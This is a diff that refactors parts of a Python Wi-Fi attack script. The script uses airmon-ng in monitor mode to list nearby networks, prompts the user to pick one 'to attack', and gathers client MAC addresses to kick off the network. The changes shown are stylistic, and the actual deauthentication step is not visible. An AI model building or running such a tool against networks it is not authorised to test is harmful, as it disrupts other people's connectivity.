@@ -27,7 +27,7 @@ import time
 # Helper functions
 def in_sudo_mode():
     """If the user doesn't run the program with super user privileges, don't allow them to continue."""
-    if not 'SUDO_UID' in os.environ.keys():
+    if 'SUDO_UID' not in os.environ.keys():
         print("Try running this program with sudo.")
         exit()
 
@@ -36,8 +36,7 @@ def find_nic():
     """This function is used to find the network interface controllers on your computer."""
     # We use the subprocess.run to run the "sudo iw dev" command we'd normally run to find the network interfaces. 
     result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
-    network_interface_controllers = wlan_code.findall(result)
-    return network_interface_controllers
+    return wlan_code.findall(result)
 
 
 def set_monitor_mode(controller_name):
@@ -76,13 +75,13 @@ def backup_csv():
             directory = os.getcwd()
             try:
                 # We make a new directory called /backup
-                os.mkdir(directory + "/backup/")
+                os.mkdir(f'{directory}/backup/')
             except:
                 print("Backup folder exists.")
             # Create a timestamp
             timestamp = datetime.now()
             # We copy any .csv files in the folder to the backup folder.
-            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
+            shutil.move(file_name, f'{directory}/backup/{str(timestamp)}-{file_name}')
 
 
 def check_for_essid(essid, lst):
@@ -104,28 +103,28 @@ def check_for_essid(essid, lst):
 
 def wifi_networks_menu():
     """ Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c."""
-    active_wireless_networks = list()
+    active_wireless_networks = []
     try:
         while True:
             # We want to clear the screen before we print the network interfaces.
             subprocess.call("clear", shell=True)
             for file_name in os.listdir():
+                if ".csv" in file_name:
                     # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
                     # The following list contains the field names for the csv entries.
                     fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
-                    if ".csv" in file_name:
-                        with open(file_name) as csv_h:
-                            # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
-                            # This creates a list of dictionaries with the keys as specified in the fieldnames.
-                            csv_h.seek(0)
-                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
-                            for row in csv_reader:
-                                if row["BSSID"] == "BSSID":
-                                    pass
-                                elif row["BSSID"] == "Station MAC":
-                                    break
-                                elif check_for_essid(row["ESSID"], active_wireless_networks):
-                                    active_wireless_networks.append(row)
+                    with open(file_name) as csv_h:
+                        # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
+                        # This creates a list of dictionaries with the keys as specified in the fieldnames.
+                        csv_h.seek(0)
+                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                        for row in csv_reader:
+                            if row["BSSID"] == "BSSID":
+                                pass
+                            elif row["BSSID"] == "Station MAC":
+                                break
+                            elif check_for_essid(row["ESSID"], active_wireless_networks):
+                                active_wireless_networks.append(row)
 
             print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
             print("No |\tBSSID              |\tChannel|\tESSID                         |")
@@ -140,7 +139,7 @@ def wifi_networks_menu():
 
     except KeyboardInterrupt:
         print("\nReady to make choice.")
-    
+
     # Ensure that the input choice is valid.
     while True:
         net_choice = input("Please select a choice from above: ")
@@ -197,7 +196,7 @@ in_sudo_mode()
 backup_csv()
 
 # Lists to be populated
-macs_not_to_kick_off = list()
+macs_not_to_kick_off = []
 
 
 # Menu to request Mac Addresses to be kept on network.
@@ -209,19 +208,19 @@ while True:
     # We reassign all the MAC address to the same variable as a list and make them uppercase using a list comprehension.
     macs_not_to_kick_off = [mac.upper() for mac in macs_not_to_kick_off]
     # If you entered a valid MAC Address the program flow will continue and break out of the while loop.
-    if len(macs_not_to_kick_off) > 0:
+    if macs_not_to_kick_off:
         break
-    
+
     print("You didn't enter valid Mac Addresses.")
 
 
+wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Will be slower)"]
 # Menu to ask which bands to scan with airmon-ng
 while True:
-    wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Will be slower)"]
     print("Please select the type of scan you want to run.")
     for index, controller in enumerate(wifi_controller_bands):
         print(f"{index} - {controller}")
-    
+
 
     # Check if the choice exists. If it doesn't it asks the user to try again.
     # We don't cast it to an integer at this stage as characters other than digits will cause the program to break.
@@ -247,7 +246,7 @@ if len(network_controllers) == 0:
 while True:
     for index, controller in enumerate(network_controllers):
         print(f"{index} - {controller}")
-    
+
     controller_choice = input("Please select the controller you want to put into monitor mode: ")
 
     try:
@@ -282,9 +281,9 @@ threads_started = []
 # Make sure that airmon-ng is running on the correct channel.
 subprocess.run(["airmon-ng", "start", wifi_name, hackchannel])
 try:
-    while True:
-        count = 0
+    count = 0
 
+    while True:
         # We want to clear the screen before we print the network interfaces.
         subprocess.call("clear", shell=True)
         for file_name in os.listdir():
@@ -299,15 +298,13 @@ try:
                     csv_h.seek(0)
                     csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                     for index, row in enumerate(csv_reader):
-                        if index < 5:
-                            pass
-                        # We will not add the MAC Addresses we specified at the beginning of the program to the ones we will kick off.
-                        elif row["Station MAC"] in macs_not_to_kick_off:
-                            pass
-                        else:
+                        if (
+                            index >= 5
+                            and row["Station MAC"] not in macs_not_to_kick_off
+                        ):
                         # Add all the active MAC Addresses.
                             active_clients.add(row["Station MAC"])
-            
+
             print("Station MAC           |")
             print("______________________|")
             for item in active_clients:
